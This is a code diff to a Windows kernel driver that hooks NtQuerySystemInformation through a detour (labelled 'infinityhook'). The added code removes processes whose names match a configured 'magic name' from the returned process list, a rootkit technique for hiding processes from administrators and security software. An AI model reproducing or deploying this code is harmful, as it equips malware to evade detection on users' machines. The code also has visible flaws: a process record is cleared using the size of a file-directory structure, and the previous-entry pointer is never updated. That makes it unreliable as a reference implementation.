@@ -53,16 +53,53 @@ NTSTATUS DetourNtQuerySystemInformation(
 		kprintf("[+] infinityhook: NtQuerySystemInformation: SystemInformationClass: %d\n", SystemInformationClass);
 
         SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
+		SYSTEM_PROCESS_INFORMATION* PreviousProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
+
         if (ProcessInformationPtr) {
             while (1) {
-                kprintf("[+] infinityhook: NtQuerySystemInformation: PID: %d\n", ProcessInformationPtr->UniqueProcessId);
+                //kprintf("[+] infinityhook: NtQuerySystemInformation: PID: %d\n", ProcessInformationPtr->UniqueProcessId);
                 WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
                 wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER));
-                /*for (size_t i = 0; i < ProcessInformationPtr->ImageName.Length / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
-                    ProcessNameBuffer[i] = (ProcessInformationPtr->FileName)[i];
-                }*/
+                //kprintf("[+] infinityhook: NtQuerySystemInformation: Process Name: %ws\n", ProcessNameBuffer);
 
-                kprintf("[+] infinityhook: NtQuerySystemInformation: Process Name: %ws\n", ProcessNameBuffer);
+				if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
+					kprintf("[+] infinityhook: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
+				}
+
+				if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
+
+					// Not the last one
+					if (ProcessInformationPtr->NextEntryOffset > 0) {
+						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
+
+						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
+						SYSTEM_PROCESS_INFORMATION* TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);
+						ULONG ProcessInformationBufferSizeToEnd = 0;
+						while (TempProcessInformationPtr->NextEntryOffset != 0) {
+							ProcessInformationBufferSizeToEnd += TempProcessInformationPtr->NextEntryOffset;
+							TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)TempProcessInformationPtr + TempProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
+						}
+						// last record size
+						ProcessInformationBufferSizeToEnd += sizeof(SYSTEM_PROCESS_INFORMATION);
+
+						// next structure address - start copying from there
+						SYSTEM_PROCESS_INFORMATION* NextProcessInformationStructAddr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);
+
+						memcpy(ProcessInformationPtr, NextProcessInformationStructAddr, ProcessInformationBufferSizeToEnd);
+
+						continue; // handle the same structure address next (because it was moved)
+					}
+
+					// Last one
+					else {
+						// set previous NextEntryOffset to 0
+						PreviousProcessInformationPtr->NextEntryOffset = 0;
+
+						// erease this FileInformation structure
+						memset(ProcessInformationPtr, 0, sizeof(FILE_DIRECTORY_INFORMATION));
+						break;
+					}
+				}
 
                 if (ProcessInformationPtr->NextEntryOffset == 0) break;
                 ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
